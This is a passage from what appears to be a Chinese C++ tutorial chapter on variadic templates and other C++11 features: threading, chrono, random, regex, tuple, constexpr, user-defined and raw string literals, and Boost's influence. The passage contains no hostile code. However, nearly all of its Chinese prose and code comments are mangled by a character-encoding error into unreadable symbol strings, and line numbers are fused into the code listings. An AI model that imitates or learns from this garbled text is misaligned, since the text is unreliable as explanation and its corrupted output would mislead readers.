Args (å¯¹äºç±»å‹å‚æ•°åŒ…)ï¼ŒType... args (å¯¹äºéç±»å‹å‚æ•°åŒ…)ã€‚ ... (çœç•¥å·) æ˜¯å…³é”®éƒ¨åˆ†ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‚æ•°åŒ…ã€‚ å‡½æ•°å‚æ•°åŒ… (Function Parameter Pack): ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªå‡½æ•°å‚æ•°ã€‚ è¯­æ³•ï¼šArgs... argsï¼Œå…¶ä¸­ Args æ˜¯ä¸€ä¸ªæ¨¡æ¿å‚æ•°åŒ…ã€‚ ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªæ¥å—ä»»æ„æ•°é‡å‚æ•°çš„å‡½æ•°æ¨¡æ¿ 1234567891011121314151617181920#include &lt;iostream&gt;// å®šä¹‰å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿ show_list// Args æ˜¯ä¸€ä¸ªæ¨¡æ¿å‚æ•°åŒ… (ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªç±»å‹)// args æ˜¯ä¸€ä¸ªå‡½æ•°å‚æ•°åŒ… (ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªå¯¹åº”ç±»å‹çš„å‚æ•°)template&lt;typename... Args&gt;void show_list(Args... args) &#123; // å¦‚ä½•å¤„ç† argsï¼Ÿè§ä¸‹æ–‡ std::cout &lt;&lt; &quot;Number of arguments: &quot; &lt;&lt; sizeof...(Args) &lt;&lt; std::endl; // æˆ–è€… sizeof...(args) ä¹Ÿå¯ä»¥&#125;int main() &#123; show_list(); // Args ä¸ºç©º, args ä¸ºç©º. è¾“å‡º: Number of arguments: 0 show_list(1); // Args = &#123;int&#125;, args = &#123;1&#125;. è¾“å‡º: Number of arguments: 1 show_list(1, &quot;hello&quot;); // Args = &#123;int, const char*&#125;, args = &#123;1, &quot;hello&quot;&#125;. è¾“å‡º: Number of arguments: 2 show_list(1, 3.14, &#x27;c&#x27;); // Args = &#123;int, double, char&#125;, args = &#123;1, 3.14, &#x27;c&#x27;&#125;. è¾“å‡º: Number of arguments: 3 return 0;&#125; sizeof...(Args) æˆ– sizeof...(args) è¿ç®—ç¬¦å¯ä»¥åœ¨ç¼–è¯‘æ—¶è·å–å‚æ•°åŒ…ä¸­çš„å‚æ•°æ•°é‡ã€‚ 18.6.2 å±•å¼€å‚æ•°åŒ…ä»…ä»…èƒ½æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ç§æ–¹æ³•æ¥å¤„ç† (å±•å¼€, Unpack) å‚æ•°åŒ…ä¸­çš„æ¯ä¸€ä¸ªå‚æ•°ã€‚åœ¨ C++11 ä¸­ï¼Œå±•å¼€å‚æ•°åŒ…é€šå¸¸éœ€è¦ä½¿ç”¨é€’å½’ (Recursion) æˆ–å…¶ä»–ä¸€äº›æ¨¡æ¿æŠ€å·§ã€‚C++17 å¼•å…¥äº†æ›´ç®€æ´çš„**æŠ˜å è¡¨è¾¾å¼ (Fold Expressions)**ï¼Œä½†è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ C++11 çš„æ–¹æ³•ã€‚ å±•å¼€å‚æ•°åŒ…çš„å…³é”®åœ¨äºæ¨¡å¼åŒ¹é…å’Œé€’å½’è°ƒç”¨ï¼šè®¾è®¡ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ï¼Œå®ƒå¤„ç†å‚æ•°åŒ…ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™çš„å‚æ•°é€’å½’è°ƒç”¨è‡ªèº«ã€‚è¿˜éœ€è¦ä¸€ä¸ªå¤„ç†å‚æ•°åŒ…ä¸ºç©ºï¼ˆé€’å½’ç»ˆæ­¢ï¼‰çš„åŸºæœ¬æƒ…å†µã€‚ 18.6.3 åœ¨å¯å˜å‚æ•°æ¨¡æ¿å‡½æ•°ä¸­ä½¿ç”¨é€’å½’æœ€å¸¸è§çš„å±•å¼€æ–¹å¼æ˜¯å®šä¹‰ä¸¤ä¸ªå‡½æ•°æ¨¡æ¿ï¼š ä¸€ä¸ªé€’å½’ç‰ˆæœ¬ï¼Œæ¥å—è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™å‚æ•°è°ƒç”¨è‡ªèº«ã€‚ ä¸€ä¸ªåŸºæœ¬æƒ…å†µç‰ˆæœ¬ï¼Œæ¥å—é›¶ä¸ªå‚æ•°ï¼Œä½œä¸ºé€’å½’çš„ç»ˆæ­¢æ¡ä»¶ã€‚ ç¤ºä¾‹ï¼šé€’å½’æ‰“å°æ‰€æœ‰å‚æ•° 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;// åŸºæœ¬æƒ…å†µï¼šå½“å‚æ•°åŒ…ä¸ºç©ºæ—¶è°ƒç”¨æ­¤ç‰ˆæœ¬ï¼Œç»ˆæ­¢é€’å½’void print_values() &#123; std::cout &lt;&lt; std::endl; // é€’å½’ç»“æŸæ—¶æ‰“å°æ¢è¡Œ&#125;// é€’å½’ç‰ˆæœ¬ï¼šå¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åç”¨å‰©ä½™å‚æ•°é€’å½’è°ƒç”¨// Args æ˜¯æ¨¡æ¿å‚æ•°åŒ… (ä»£è¡¨å‰©ä½™å‚æ•°çš„ç±»å‹)// args æ˜¯å‡½æ•°å‚æ•°åŒ… (ä»£è¡¨å‰©ä½™å‚æ•°çš„å€¼)template&lt;typename T, typename... Args&gt;void print_values(const T&amp; first_arg, const Args&amp;... rest_args) &#123; // 1. å¤„ç†ç¬¬ä¸€ä¸ªå‚æ•° std::cout &lt;&lt; first_arg; // 2. å¦‚æœè¿˜æœ‰å‰©ä½™å‚æ•°ï¼Œæ‰“å°åˆ†éš”ç¬¦å¹¶é€’å½’è°ƒç”¨ if constexpr (sizeof...(Args) &gt; 0) &#123; // C++17 if constexpr, ç®€åŒ–æ¡ä»¶ç¼–è¯‘ std::cout &lt;&lt; &quot;, &quot;; print_values(rest_args...); // å°†å‰©ä½™å‚æ•°åŒ…å±•å¼€å¹¶ä¼ é€’ç»™ä¸‹ä¸€æ¬¡è°ƒç”¨ &#125; else &#123; print_values(); // è°ƒç”¨åŸºæœ¬æƒ…å†µç‰ˆæœ¬ï¼Œæ‰“å°æ¢è¡Œ &#125; // C++11 å†™æ³• (æ²¡æœ‰ if constexpr): // if (sizeof...(Args) &gt; 0) &#123; // std::cout &lt;&lt; &quot;, &quot;; // &#125; // print_values(rest_args...); // é€’å½’è°ƒç”¨ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° print_values() ç‰ˆæœ¬&#125;int main() &#123; std::cout &lt;&lt; &quot;Printing values:\\n&quot;; print_values(1, &quot;hello&quot;, 3.14, &#x27;a&#x27;); // è¾“å‡º: 1, hello, 3.14, a print_values(&quot;Single argument&quot;); // è¾“å‡º: Single argument print_values(); // è¾“å‡º: (ç©ºè¡Œ) return 0;&#125; è°ƒç”¨è¿‡ç¨‹åˆ†æ print_values(1, &quot;hello&quot;, 3.14, &#39;a&#39;): è°ƒç”¨ print_values&lt;int, const char*, double, char&gt;(1, &quot;hello&quot;, 3.14, &#39;a&#39;) first_arg = 1, rest_args... = {â€œhelloâ€, 3.14, â€˜aâ€™} è¾“å‡º â€œ1, â€œ é€’å½’è°ƒç”¨ print_values(&quot;hello&quot;, 3.14, &#39;a&#39;) è°ƒç”¨ print_values&lt;const char*, double, char&gt;(&quot;hello&quot;, 3.14, &#39;a&#39;) first_arg = â€œhelloâ€, rest_args... = {3.14, â€˜aâ€™} è¾“å‡º â€œhello, â€œ é€’å½’è°ƒç”¨ print_values(3.14, &#39;a&#39;) è°ƒç”¨ print_values&lt;double, char&gt;(3.14, &#39;a&#39;) first_arg = 3.14, rest_args... = {â€˜aâ€™} è¾“å‡º â€œ3.14, â€œ é€’å½’è°ƒç”¨ print_values(&#39;a&#39;) è°ƒç”¨ print_values&lt;char&gt;(&#39;a&#39;) first_arg = â€˜aâ€™, rest_args... = {} (ç©ºåŒ…) è¾“å‡º â€œaâ€ é€’å½’è°ƒç”¨ print_values() è°ƒç”¨ print_values() (åŸºæœ¬æƒ…å†µ) è¾“å‡º std::endl é€’å½’ç»“æŸ å±•å¼€è¯­æ³• rest_args...: å½“åœ¨å‡½æ•°è°ƒç”¨ä¸­å¯¹å‡½æ•°å‚æ•°åŒ…ä½¿ç”¨ ... æ—¶ï¼Œå®ƒä¼šå°†åŒ…ä¸­çš„æ¯ä¸ªå…ƒç´ å±•å¼€ï¼Œä½œä¸ºç‹¬ç«‹çš„å‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚ å…¶ä»–å±•å¼€æŠ€å·§ (C++11): è™½ç„¶é€’å½’æ˜¯æœ€å¸¸è§çš„æ–¹å¼ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€å·§ï¼Œä¾‹å¦‚åˆ©ç”¨åˆå§‹åŒ–åˆ—è¡¨æˆ–æ•°ç»„çš„é€—å·è¿ç®—ç¬¦ç‰¹æ€§æ¥å±•å¼€ï¼Œä½†è¿™äº›æŠ€å·§é€šå¸¸æ›´å¤æ‚ä¸”å¯è¯»æ€§è¾ƒå·®ã€‚ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;// ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨å±•å¼€ (æŠ€å·§æ€§è¾ƒå¼º)template&lt;typename... Args&gt;void print_values_trick(const Args&amp;... args) &#123; // åˆ›å»ºä¸€ä¸ªä¸´æ—¶ int æ•°ç»„ï¼Œåˆ©ç”¨åˆå§‹åŒ–åˆ—è¡¨å’Œé€—å·è¿ç®—ç¬¦ // å¯¹åŒ…ä¸­çš„æ¯ä¸ªå‚æ•°æ‰§è¡Œ (std::cout &lt;&lt; arg &lt;&lt; &quot; &quot;, 0) // ç»“æœæ˜¯ &#123;0, 0, 0, ...&#125;ï¼Œä½†å‰¯ä½œç”¨æ˜¯æ‰“å°äº†å‚æ•° int dummy[] = &#123;0, ( (std::cout &lt;&lt; args &lt;&lt; &quot; &quot;), 0 )... &#125;; // (void)dummy; // é¿å…æœªä½¿ç”¨å˜é‡è­¦å‘Š (å¯é€‰) std::cout &lt;&lt; std::endl;&#125;int main() &#123; print_values_trick(10, &quot;world&quot;, 0.5); // è¾“å‡º: 10 world 0.5 return 0;&#125; è¿™ç§æŠ€å·§åˆ©ç”¨äº† C++11 ä¸­ ... å¯ä»¥åœ¨è¡¨è¾¾å¼ä¸­å±•å¼€å‚æ•°åŒ…çš„ç‰¹æ€§ (pattern)...ï¼Œå…¶ä¸­ pattern ä¼šå¯¹åŒ…ä¸­çš„æ¯ä¸ªå…ƒç´ åº”ç”¨ä¸€æ¬¡ã€‚ å¯å˜å‚æ•°æ¨¡æ¿æ˜¯ C++ å…ƒç¼–ç¨‹å’Œæ³›å‹ç¼–ç¨‹çš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—ç¼–å†™èƒ½å¤Ÿå¤„ç†ä»»æ„æ•°é‡å‚æ•°çš„ç±»å‹å®‰å…¨å‡½æ•°ï¼ˆå¦‚è‡ªå®šä¹‰çš„ printfã€make_tupleã€emplace_back ç­‰ï¼‰æˆä¸ºå¯èƒ½ã€‚ 18.7 C++11æ–°å¢çš„å…¶ä»–åŠŸèƒ½é™¤äº†å‰é¢ç« èŠ‚å·²ç»è¯¦ç»†è®¨è®ºæˆ–å›é¡¾çš„ä¸»è¦ç‰¹æ€§ï¼ˆå¦‚ auto, nullptr, ç»Ÿä¸€åˆå§‹åŒ–, ç§»åŠ¨è¯­ä¹‰, Lambda, æ™ºèƒ½æŒ‡é’ˆ, èŒƒå›´ for, æ–°ç±»åŠŸèƒ½, å¯å˜å‚æ•°æ¨¡æ¿ç­‰ï¼‰ä¹‹å¤–ï¼ŒC++11 æ ‡å‡†è¿˜å¼•å…¥äº†è®¸å¤šå…¶ä»–é‡è¦çš„åŠŸèƒ½å’Œåº“ï¼Œè¿›ä¸€æ­¥å¢å¼ºäº†è¯­è¨€çš„èƒ½åŠ›ã€‚æœ¬èŠ‚å°†ç®€è¦ä»‹ç»å…¶ä¸­çš„ä¸€äº›ã€‚ 18.7.1 å¹¶è¡Œç¼–ç¨‹C++11 é¦–æ¬¡åœ¨æ ‡å‡†åº“å±‚é¢æä¾›äº†å¯¹å¤šçº¿ç¨‹å¹¶å‘ç¼–ç¨‹çš„æ”¯æŒï¼Œä¸»è¦å®šä¹‰åœ¨ &lt;thread&gt;, &lt;mutex&gt;, &lt;condition_variable&gt;, &lt;future&gt;, &lt;atomic&gt; ç­‰å¤´æ–‡ä»¶ä¸­ã€‚ std::thread: ç”¨äºåˆ›å»ºå’Œç®¡ç†çº¿ç¨‹ã€‚å…è®¸å‡½æ•°æˆ–å¯è°ƒç”¨å¯¹è±¡åœ¨ç‹¬ç«‹çš„çº¿ç¨‹ä¸­æ‰§è¡Œã€‚ 12345678910111213#include &lt;thread&gt;#include &lt;iostream&gt;void worker_thread() &#123; std::cout &lt;&lt; &quot;Worker thread running.\\n&quot;;&#125;int main() &#123; std::thread t(worker_thread); // åˆ›å»ºæ–°çº¿ç¨‹å¹¶æ‰§è¡Œ worker_thread std::cout &lt;&lt; &quot;Main thread running.\\n&quot;; t.join(); // ç­‰å¾… worker_thread æ‰§è¡Œå®Œæ¯• return 0;&#125; äº’æ–¥é‡ (std::mutex, std::lock_guard, std::unique_lock): ç”¨äºä¿æŠ¤å…±äº«æ•°æ®ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å¯¼è‡´çš„æ•°æ®ç«äº‰ã€‚lock_guard å’Œ unique_lock æä¾›äº† RAII é£æ ¼çš„é”ç®¡ç†ï¼Œç¡®ä¿äº’æ–¥é‡èƒ½è¢«æ­£ç¡®é‡Šæ”¾ã€‚ 1234567891011#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;std::mutex data_mutex;std::vector&lt;int&gt; shared_data;void add_data(int val) &#123; std::lock_guard&lt;std::mutex&gt; lock(data_mutex); // è‡ªåŠ¨åŠ é”ï¼Œç¦»å¼€ä½œç”¨åŸŸæ—¶è‡ªåŠ¨è§£é” shared_data.push_back(val);&#125; æ¡ä»¶å˜é‡ (std::condition_variable): ç”¨äºçº¿ç¨‹é—´çš„åŒæ­¥ï¼Œå…è®¸ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…æŸä¸ªæ¡ä»¶å˜ä¸ºçœŸï¼ˆç”±å¦ä¸€ä¸ªçº¿ç¨‹é€šçŸ¥ï¼‰ã€‚é€šå¸¸ä¸ std::mutex å’Œ std::unique_lock é…åˆä½¿ç”¨ã€‚ åŸå­æ“ä½œ (std::atomic&lt;T&gt;): æä¾›å¯¹åŸºæœ¬ç±»å‹çš„åŸå­æ“ä½œï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€å¢å‡ã€æ¯”è¾ƒäº¤æ¢ï¼‰ï¼Œä¿è¯è¿™äº›æ“ä½œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¸ä¼šè¢«æ‰“æ–­ï¼Œé¿å…äº†æ•°æ®ç«äº‰ï¼Œé€šå¸¸æ¯”ä½¿ç”¨äº’æ–¥é‡æ›´é«˜æ•ˆã€‚ 123#include &lt;atomic&gt;std::atomic&lt;int&gt; counter = 0;// counter++; // åŸå­åœ°è‡ªå¢ å¼‚æ­¥æ“ä½œ (std::async, std::future, std::promise): æä¾›äº†ä¸€ç§æ›´é«˜çº§çš„å¹¶å‘æ¨¡å‹ï¼Œå…è®¸å¼‚æ­¥åœ°æ‰§è¡Œä»»åŠ¡å¹¶è·å–å…¶ç»“æœã€‚std::async å¯ä»¥å¯åŠ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œè¿”å›ä¸€ä¸ª std::future å¯¹è±¡ï¼Œé€šè¿‡ future å¯ä»¥åœ¨ç¨åè·å–ä»»åŠ¡çš„è¿”å›å€¼æˆ–ç­‰å¾…ä»»åŠ¡å®Œæˆã€‚promise åˆ™ç”¨äºåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è®¾ç½®å€¼æˆ–å¼‚å¸¸ï¼Œä¾›å¦ä¸€ä¸ªçº¿ç¨‹é€šè¿‡å…³è”çš„ future è·å–ã€‚ C++11 çš„å¹¶å‘æ”¯æŒä½¿å¾—ç¼–å†™å¯ç§»æ¤çš„å¤šçº¿ç¨‹ç¨‹åºæˆä¸ºå¯èƒ½ã€‚ 18.7.2 æ–°å¢çš„åº“C++11 æ ‡å‡†åº“å¢åŠ äº†å‡ ä¸ªå®ç”¨çš„æ–°ç»„ä»¶ï¼š &lt;chrono&gt;: æä¾›äº†å¤„ç†æ—¶é—´å’Œæ—¶é—´æ®µçš„ç±»å‹å®‰å…¨ã€ç²¾ç¡®çš„åº“ã€‚åŒ…æ‹¬æ—¶é’Ÿ (system_clock, steady_clock, high_resolution_clock)ã€æ—¶é—´ç‚¹ (time_point) å’Œæ—¶é—´æ®µ (duration)ã€‚ 12345678910111213#include &lt;chrono&gt;#include &lt;iostream&gt;#include &lt;thread&gt; // for sleep_forint main() &#123; auto start = std::chrono::high_resolution_clock::now(); std::this_thread::sleep_for(std::chrono::milliseconds(50)); // ä¼‘çœ  50 æ¯«ç§’ auto end = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double, std::milli&gt; elapsed = end - start; // è®¡ç®—æ¯«ç§’å·® std::cout &lt;&lt; &quot;Elapsed time: &quot; &lt;&lt; elapsed.count() &lt;&lt; &quot; ms\\n&quot;; return 0;&#125; &lt;random&gt;: æä¾›äº†æ¯” C é£æ ¼ rand() æ›´å¼ºå¤§ã€æ›´çµæ´»çš„éšæœºæ•°ç”Ÿæˆå·¥å…·ã€‚åŒ…æ‹¬å¤šç§éšæœºæ•°å¼•æ“ï¼ˆå¦‚ mt19937ï¼‰å’Œåˆ†å¸ƒï¼ˆå¦‚ uniform_int_distribution, normal_distributionï¼‰ã€‚ 1234567891011#include &lt;random&gt;#include &lt;iostream&gt;int main() &#123; std::random_device rd; // ç”¨äºç”Ÿæˆç§å­ (å¯èƒ½åŸºäºç¡¬ä»¶) std::mt19937 gen(rd()); // Mersenne Twister å¼•æ“ std::uniform_int_distribution&lt;&gt; distrib(1, 6); // å‡åŒ€åˆ†å¸ƒ [1, 6] std::cout &lt;&lt; &quot;Rolling a die: &quot; &lt;&lt; distrib(gen) &lt;&lt; std::endl; // ç”Ÿæˆéšæœºæ•° return 0;&#125; &lt;regex&gt;: æä¾›äº†å¯¹æ­£åˆ™è¡¨è¾¾å¼ (Regular Expressions) çš„æ”¯æŒï¼Œç”¨äºå¼ºå¤§çš„æ–‡æœ¬æ¨¡å¼åŒ¹é…å’Œæœç´¢/æ›¿æ¢ã€‚ 1234567891011121314#include &lt;regex&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string text = &quot;Email: example@test.com&quot;; std::regex email_regex(R&quot;(\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b)&quot;); // åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡ std::smatch match; if (std::regex_search(text, match, email_regex)) &#123; std::cout &lt;&lt; &quot;Found email: &quot; &lt;&lt; match.str(0) &lt;&lt; std::endl; &#125; return 0;&#125; &lt;tuple&gt;: æä¾›äº†å…ƒç»„ (Tuple) ç±»å‹ std::tupleï¼Œå¯ä»¥çœ‹ä½œæ˜¯åŒ¿åçš„ã€å›ºå®šå¤§å°çš„å¼‚æ„å€¼é›†åˆï¼Œç±»ä¼¼äº std::pair çš„æ³›åŒ–ã€‚ 1234567891011#include &lt;tuple&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::tuple&lt;int, std::string, double&gt; t1(10, &quot;hello&quot;, 3.14); std::cout &lt;&lt; &quot;Tuple element 0: &quot; &lt;&lt; std::get&lt;0&gt;(t1) &lt;&lt; std::endl; // ä½¿ç”¨ std::get&lt;i&gt; è®¿é—® std::cout &lt;&lt; &quot;Tuple element 1: &quot; &lt;&lt; std::get&lt;1&gt;(t1) &lt;&lt; std::endl; // C++17 ç»“æ„åŒ–ç»‘å®šæ›´æ–¹ä¾¿: auto [id, name, value] = t1; return 0;&#125; 18.7.3 ä½çº§ç¼–ç¨‹C++11 ä¹Ÿå¢å¼ºäº†å¯¹åº•å±‚å†…å­˜å¸ƒå±€å’Œç¼–è¯‘æ—¶è®¡ç®—çš„æ”¯æŒï¼š å¯¹é½æ§åˆ¶ (alignas, alignof): alignas: ç”¨äºæŒ‡å®šå˜é‡æˆ–ç±»å‹çš„å†…å­˜å¯¹é½è¦æ±‚ã€‚ alignof: ç”¨äºæŸ¥è¯¢ç±»å‹æˆ–å¯¹è±¡çš„å¯¹é½è¦æ±‚ï¼ˆè¿”å›ä¸€ä¸ª size_tï¼‰ã€‚1234567891011#include &lt;iostream&gt;struct alignas(16) AlignedStruct &#123; // è¦æ±‚æŒ‰ 16 å­—èŠ‚å¯¹é½ char data[32];&#125;;int main() &#123; std::cout &lt;&lt; &quot;Alignment of int: &quot; &lt;&lt; alignof(int) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Alignment of AlignedStruct: &quot; &lt;&lt; alignof(AlignedStruct) &lt;&lt; std::endl; // è¾“å‡º 16 return 0;&#125; constexpr: ç”¨äºå£°æ˜å‡½æ•°æˆ–å˜é‡å¯ä»¥åœ¨ç¼–è¯‘æ—¶æ±‚å€¼ã€‚constexpr å‡½æ•°å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç”¨äºå¸¸é‡è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶åƒæ™®é€šå‡½æ•°ä¸€æ ·ä½¿ç”¨ã€‚constexpr å˜é‡å¿…é¡»ç”¨å¸¸é‡è¡¨è¾¾å¼åˆå§‹åŒ–ã€‚è¿™ä½¿å¾—æ›´å¤šçš„è®¡ç®—å¯ä»¥åœ¨ç¼–è¯‘é˜¶æ®µå®Œæˆï¼Œæé«˜äº†è¿è¡Œæ—¶æ€§èƒ½å¹¶å¢å¼ºäº†å…ƒç¼–ç¨‹èƒ½åŠ›ã€‚ 12345678910111213141516#include &lt;array&gt;// constexpr å‡½æ•°ï¼Œå¯åœ¨ç¼–è¯‘æ—¶è®¡ç®—constexpr int factorial(int n) &#123; return (n &lt;= 1) ? 1 : (n * factorial(n - 1));&#125;int main() &#123; constexpr int five_factorial = factorial(5); // ç¼–è¯‘æ—¶è®¡ç®—ç»“æœä¸º 120 std::array&lt;int, factorial(4)&gt; arr; // æ•°ç»„å¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šä¸º 24 int runtime_val = 6; int six_factorial = factorial(runtime_val); // è¿è¡Œæ—¶è®¡ç®— return 0;&#125; 18.7.4 æ‚é¡¹ ç”¨æˆ·å®šä¹‰å­—é¢é‡ (User-defined Literals): å…è®¸ç¨‹åºå‘˜ä¸ºå­—é¢é‡ï¼ˆå¦‚ &quot;hello&quot;, 123, 3.14ï¼‰å®šä¹‰åç¼€ï¼Œä»è€Œåˆ›å»ºå…·æœ‰ç‰¹å®šç±»å‹æˆ–æ„ä¹‰çš„å¯¹è±¡ã€‚åç¼€é€šå¸¸ä»¥ä¸‹åˆ’çº¿ _ å¼€å¤´ã€‚ 12345678910111213#include &lt;chrono&gt;#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªå°†ç§’è½¬æ¢ä¸ºæ¯«ç§’çš„ç”¨æˆ·å®šä¹‰å­—é¢é‡åç¼€ _msconstexpr std::chrono::milliseconds operator&quot;&quot; _ms(unsigned long long ms) &#123; return std::chrono::milliseconds(ms);&#125;int main() &#123; auto duration = 150_ms; // duration çš„ç±»å‹æ˜¯ std::chrono::millisecondsï¼Œå€¼ä¸º 150ms std::cout &lt;&lt; &quot;Duration: &quot; &lt;&lt; duration.count() &lt;&lt; &quot;ms\\n&quot;; return 0;&#125; åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡ (Raw String Literals): ç”¨äºç®€åŒ–åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚åæ–œæ  \\ã€å¼•å· &quot;ï¼‰çš„å­—ç¬¦ä¸²çš„å®šä¹‰ï¼Œé¿å…äº†ç¹ççš„è½¬ä¹‰ã€‚ è¯­æ³•ï¼šR&quot;delimiter(raw_characters)delimiter&quot; delimiter æ˜¯å¯é€‰çš„åˆ†éš”ç¬¦åºåˆ—ï¼ˆä¸èƒ½åŒ…å«æ‹¬å·ã€åæ–œæ æˆ–ç©ºæ ¼ï¼‰ï¼Œç”¨äºåŒºåˆ†å­—ç¬¦ä¸²å†…å®¹å’Œç»“æŸæ ‡è®°ã€‚1234567891011121314151617#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; // æ— éœ€è½¬ä¹‰åæ–œæ å’Œå¼•å· std::string path = R&quot;(C:\\Program Files\\My App\\data.txt)&quot;; std::string html = R&quot;delimiter(&lt;html&gt; &lt;head&gt;&lt;title&gt;&quot;Example&quot;&lt;/title&gt;&lt;/head&gt; &lt;body&gt;Hello, world!&lt;/body&gt;&lt;/html&gt;)delimiter&quot;; std::cout &lt;&lt; path &lt;&lt; std::endl; std::cout &lt;&lt; html &lt;&lt; std::endl; return 0;&#125; è¿™äº›åªæ˜¯ C++11 æ–°å¢åŠŸèƒ½çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä»¬å…±åŒæ„æˆäº†ç°ä»£ C++ çš„åŸºç¡€ï¼Œä½¿å¾— C++ æˆä¸ºä¸€é—¨åŠŸèƒ½æ›´å¼ºå¤§ã€è¡¨è¾¾åŠ›æ›´å¼ºã€æ›´æ˜“äºä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ã€‚ 18.8 è¯­è¨€å˜åŒ–C++ æ˜¯ä¸€é—¨ä¸æ–­å‘å±•çš„è¯­è¨€ã€‚ä» C++98/03 åˆ° C++11ï¼Œå†åˆ°åç»­çš„ C++14, C++17, C++20 ç­‰æ ‡å‡†ï¼Œè¯­è¨€æœ¬èº«å’Œæ ‡å‡†åº“éƒ½åœ¨æŒç»­æ¼”è¿›ï¼Œä»¥æ»¡è¶³ç°ä»£è½¯ä»¶å¼€å‘çš„éœ€æ±‚ã€‚C++11 æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„ç‰ˆæœ¬ï¼Œå¼•å…¥äº†å¤§é‡é‡è¦ç‰¹æ€§ï¼Œå…¶ä¸­è®¸å¤šç‰¹æ€§å¹¶éå‡­ç©ºå‡ºç°ï¼Œè€Œæ˜¯åœ¨æ ‡å‡†åŒ–ä¹‹å‰ç»è¿‡äº†ç¤¾åŒºçš„å¹¿æ³›è®¨è®ºå’Œå®è·µæ£€éªŒã€‚Boost åº“å’Œ TR1 åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­æ‰®æ¼”äº†é‡è¦è§’è‰²ã€‚ 18.8.1 Boost é¡¹ç›®Boost C++ åº“ (Boost C++ Libraries) æ˜¯ä¸€ä¸ªå¹¿å—æ¨å´‡çš„ã€é«˜è´¨é‡çš„ã€ç»è¿‡åŒè¡Œè¯„å®¡çš„ C++ åº“é›†åˆã€‚å®ƒç”± C++ ç¤¾åŒºçš„ä¼—å¤šå¼€å‘è€…å…±åŒç»´æŠ¤å’Œè´¡çŒ®ã€‚ ç›®çš„: Boost æ—¨åœ¨æä¾›å„ç§é€šç”¨å’Œç‰¹å®šé¢†åŸŸçš„åº“ï¼Œæ‰©å±• C++ æ ‡å‡†åº“çš„åŠŸèƒ½ã€‚å®ƒæ—¢åŒ…å«å¯ä»¥ç›´æ¥ä½¿ç”¨çš„å·¥å…·ï¼ˆå¦‚æ—¥æœŸæ—¶é—´å¤„ç†ã€æ–‡ä»¶ç³»ç»Ÿæ“ä½œã€æ­£åˆ™è¡¨è¾¾å¼ã€æµ‹è¯•æ¡†æ¶ç­‰ï¼‰ï¼Œä¹ŸåŒ…å«ä¸€äº›å®éªŒæ€§çš„ã€å¯èƒ½åœ¨æœªæ¥è¢«çº³å…¥ C++ æ ‡å‡†çš„åº“ã€‚ å½±å“åŠ›: Boost å¯¹ C++ æ ‡å‡†çš„å‘å±•äº§ç”Ÿäº†æ·±è¿œå½±å“ã€‚è®¸å¤š C++11 åŠåç»­æ ‡å‡†ä¸­çš„æ–°ç‰¹æ€§ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ shared_ptrã€å‡½æ•°åŒ…è£…å™¨ functionã€çº¿ç¨‹åº“ã€æ­£åˆ™è¡¨è¾¾å¼åº“ã€å…ƒç»„ tupleã€array ç­‰ï¼‰éƒ½èµ·æºäº Boost åº“ä¸­çš„å¯¹åº”ç»„ä»¶ï¼Œå¹¶åœ¨ Boost ä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨å’ŒéªŒè¯ã€‚ â€œè¯•ç‚¼åœºâ€: Boost å¸¸å¸¸è¢«è§†ä¸º C++ æ–°ç‰¹æ€§çš„â€œè¯•ç‚¼åœºâ€ã€‚ä¸€ä¸ªåº“å¦‚æœåœ¨ Boost ä¸­è¢«è¯æ˜æ˜¯ç¨³å®šã€æœ‰ç”¨ä¸”è®¾è®¡è‰¯å¥½çš„ï¼Œé‚£ä¹ˆå®ƒè¢« 